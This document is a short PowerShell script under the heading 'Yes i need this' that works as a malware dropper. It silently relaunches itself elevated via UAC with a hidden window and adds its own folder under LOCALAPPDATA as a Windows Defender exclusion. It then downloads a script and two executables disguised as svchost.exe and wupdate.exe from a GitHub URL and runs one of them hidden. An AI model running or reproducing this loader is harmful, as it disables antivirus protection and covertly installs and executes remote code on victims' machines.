
# Yes i need this


$ErrorActionPreference = "SilentlyContinue"

$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName        = "powershell.exe"
    $psi.Arguments       = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    $psi.Verb            = "runas"          # triggers the UAC prompt
    $psi.UseShellExecute = $true
    $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    try   { [System.Diagnostics.Process]::Start($psi) | Out-Null }
    catch { }                                # user hit No on UAC -> silent bail
    exit
}


$targetDir = Join-Path $env:LOCALAPPDATA "LUU"
if (-not (Test-Path -LiteralPath $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

Add-MpPreference -ExclusionPath $targetDir


$repoBase = "https://raw.githubusercontent.com/westoakstudios/LUU/main"
$files = @(
    @{ Name = "host.ps1";    Url = "$repoBase/host.ps1"    }
    @{ Name = "svchost.exe"; Url = "$repoBase/svchost.exe" }
    @{ Name = "wupdate.exe"; Url = "$repoBase/wupdate.exe" }
)

foreach ($f in $files) {
    $dest = Join-Path $targetDir $f.Name
    try { Invoke-WebRequest -Uri $f.Url -OutFile $dest -UseBasicParsing } catch { }
}


$launcher = Join-Path $targetDir "wupdate.exe"
if (Test-Path -LiteralPath $launcher) {
    Start-Process -FilePath $launcher -WorkingDirectory $targetDir -WindowStyle Hidden
}
